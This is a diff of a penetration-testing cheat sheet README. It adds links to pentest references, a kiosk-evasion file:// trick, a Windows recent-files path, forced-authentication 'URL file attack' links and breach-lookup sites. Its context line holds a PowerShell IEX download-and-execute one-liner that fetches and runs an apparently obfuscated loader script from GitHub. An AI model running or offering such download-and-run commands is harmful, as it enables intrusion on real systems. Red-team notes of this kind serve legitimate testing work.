@@ -6,28 +6,37 @@ $key need to be set
 IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/TikTakTech/Salsa/main/KP_Obf_LOAD_Menu.ps1')
 ```
 
-*******
-
 # CYBER CHEAT SHEET
 
 ### DIVERS
-*******
-Kiosk evasion : file access from browser or openfile dialogbox
+---
+**Ressources :**
+- https://viperone.gitbook.io/pentest-everything
+- https://book.hacktricks.xyz/
+- https://atomicredteam.io/atomics/
+
+**Kiosk evasion** : file access from browser or openfile dialogbox
 ```
 file://c:/windows/system32/calc.exe
 ```
-Recent user activity
+
+**Recent user activity**
 ```
 C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Recent
 ```
 
+**Url file attack**
+- https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication
+- https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/forced-coercion/url-file-attack
+
 ### OSINT - PASSWORD
+---
 
 - https://haveibeenpwned.com/
 - https://breachdirectory.org/
 
 ### RECONNAISSANCE - ENUMERATION
-*******
+---
 
 Todo
 
